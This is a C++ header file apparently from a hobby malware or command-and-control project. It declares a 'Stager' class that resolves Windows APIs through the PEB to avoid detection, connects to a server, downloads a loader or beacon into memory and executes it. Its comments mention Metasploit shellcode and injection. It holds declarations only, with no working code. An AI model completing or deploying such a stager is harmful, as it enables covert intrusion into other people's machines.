/* stager.h */

/*
TODO: 
if stager isn't in shell code, it should be either an exe or a dll (that runs via rundll32 or injection)
stager will probs have to be an exe cuz i only know how to turn .exe into shell code (using metasploit)
*/

#include <winsock2.h> // needed by socket and connect?
//#include "winsock_util.h"
//#include "payload_util.h"
#include "../utils/utils.h"
#include "../utils/kernel32_util.h"

#include <string> // TODO: done use string later on as it imports a lot of unneeded stuff

//#define WIN32_LEAN_AND_MEAN // reduces stuff imported from header
//#include <windows.h>
//#undef WIN32_LEAN_AND_MEAN
#include <iostream>
#include <string>

#include <vector>
#include <ws2tcpip.h>


#include <iostream>

#include <ws2tcpip.h> // needed by getaddrinfo
// #include <winhttp.h> uncomment when implmenting https c2

class Stager
{
public:
    Stager() {};
    //~Stager();
    bool run(const std::string& host, const std::string& port);
private:
    // Manually resolve API via PEB/TEB
    void resolveAPIs();
    void connectToServer();
    void allocateMemoryForLoader(); // or beacon
    void downloadLoader();
    void executeLoader(); // jump to location in memory where we downloaded it too
};